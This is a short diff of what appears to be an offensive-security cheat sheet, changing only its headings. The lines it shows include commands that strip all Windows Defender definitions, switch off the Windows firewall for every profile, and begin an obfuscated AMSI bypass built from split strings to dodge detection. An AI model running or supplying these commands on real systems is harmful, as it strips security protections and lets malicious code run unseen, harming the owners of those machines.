@@ -1,4 +1,4 @@
-### Defender
+### Disable Defender
 Powershell:
 ```
 cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
@@ -16,7 +16,7 @@ netsh advfirewall set allprofiles state off
 ```
 
 
-#### Simple AMSI bypass
+### Simple AMSI bypass
 ```
 $a = [Ref].Assembly.GetType('System.Management.Automation' + '.A' + 'm' + 's' + 'iU' + 'til' + 's')
 $b = 'am'+'s'+'iI'+'n'+'it'+'Fai'+'l'+'ed'
